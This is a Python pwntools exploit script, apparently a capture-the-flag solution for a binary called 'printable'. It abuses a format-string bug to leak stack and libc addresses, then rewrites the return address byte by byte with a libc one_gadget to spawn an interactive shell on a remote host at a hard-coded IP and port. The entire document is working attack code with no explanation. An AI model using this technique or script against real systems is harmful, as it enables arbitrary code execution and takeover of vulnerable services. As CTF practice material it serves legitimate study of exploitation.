#!/usr/bin/env python3
from pwn import *
import sys
import pwnlib.shellcraft
import pwnlib

c = 0
pwn_file = "./printable"
c = process(pwn_file, env={'LD_PRELOAD': './libc-2.27.so'})

elf = ELF(pwn_file)
lib = ELF('./libc-2.27.so')
context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

context.log_level = 100
#context.log_level = 'debug'


debug = 0
if debug == 1:
    gdb_script = 'b *0x40121e'
    gdb.attach(c, gdb_script)
else:
    c = remote('140.110.112.77', '4005')

def list_stack():
    for i in range(1, 50):
        c.sendline('!%{}$p!'.format(i))
        c.recvuntil('!')
        print(i, c.recvuntil('!'))


if debug == 1:
    list_stack()

list_stack()


def sync():
    c.send('sync\0')
    c.recvuntil('sync')

# step 1 get rbp and libc
sync()
c.sendline('!%7$p!%10$p!\0')
c.recvuntil('!')
rbp = int(c.recvuntil('!')[:-1], 16)
libc_base = int(c.recvuntil('!')[:-1], 16) - lib.symbols['__libc_start_main'] - 231
print(hex(rbp), hex(libc_base))
sync()

# step 2 rbp point to ret addr


def get_byte(addr, right_shift): return (addr >> (8 * right_shift)) & 0xff

def write_rbp(offset):
    sync()
    c.sendline('%{}c%5$hn\0'.format((rbp - 8 + offset) & 0xffff))
    sync()

    # check
    sync()

    c.send('!%7$p!\0')
    c.recvuntil('!')
    check = c.recvuntil('!')[:-1]
    print(check)
    assert(int(check , 16) == rbp - 8 + offset)

    sync()
    return rbp

write_rbp(0)
write_rbp(0)
# write_rbp(0)
# write_rbp(0)

# step 3 clean rsp+0x40
sync()
for i in range(4):
    write_rbp((16 - 8) * 8 - 8 + i * 8) #+ 0x30)
    c.send('%7$lln\0')
sync()


# step 4 write ret addr
one_gadget = libc_base + 0x4f322
print(hex(one_gadget))

byte_list = []
for i in range(0, 8):
    byte = get_byte(one_gadget, i)
    print(hex(byte))
    byte_list.append(byte)

for i in range(0, 8):
    write_rbp(i)
    byte = byte_list[i]
    p = pwnlib.fmtstr.make_payload_dollar(7, [pwnlib.fmtstr.AtomWrite(0x0, 0x1, byte)])[0] + b'sync'
    c.send(p + b'\0')
    c.recvuntil('sync')


# setp 5 exit
c.send('exit\0')



c.interactive()
c.close()

